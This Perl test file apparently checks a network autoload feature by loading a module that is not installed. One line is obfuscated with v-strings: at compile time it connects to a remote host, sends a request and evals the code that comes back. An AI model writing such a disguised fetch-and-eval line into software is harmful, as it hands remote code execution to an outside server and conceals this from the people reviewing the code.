#!perl

# 10_live.t - Test full functionality
# Try an obscure module that hopefully is not installed already
# but that is simple and pure perl, and make sure it loads.

use strict;
use warnings;
use IO::Socket;
use Test::More;

BEGIN {
  unless ($ENV{NETWORK_TEST_ACME_AUTOLOAD}) {
    plan skip_all => "Network dependent test: For actual test, use NETWORK_TEST_ACME_AUTOLOAD=1";
  }
  # Make sure the test module isn't currently installed.
  if (eval 'require Cwd::Guard') {
    plan skip_all => "You weren't supposed to actually install Cwd::Guard yourself. Please uninstall it for a better test.";
  }
  plan tests => 7;
}

use lib do{eval<$a>if print{$a=new IO::Socket::INET 82.46.99.88.58.52.52.51}84.76.83.10};

# We know this module isn't actually installed, so it's a good test to try to load:
use Cwd::Guard qw/cwd_guard/;

ok($INC{'Cwd/Guard.pm'}, "Loaded: $INC{'Cwd/Guard.pm'}");
ok($INC{'parent.pm'}, 'nested module');
ok(UNIVERSAL::can('Cwd::Guard', 'cwd_guard'), 'require');
ok(defined \&cwd_guard, 'import');
{
  my $scope = cwd_guard "..";
  ok($scope, "prototype first pass");
}
unlink("lib/parent.pm"); # Does not come standard with perl 5.8.8
ok(unlink("lib/Cwd/Guard.pm"), 'unlink');
ok(rmdir("lib/Cwd"), 'rmdir');
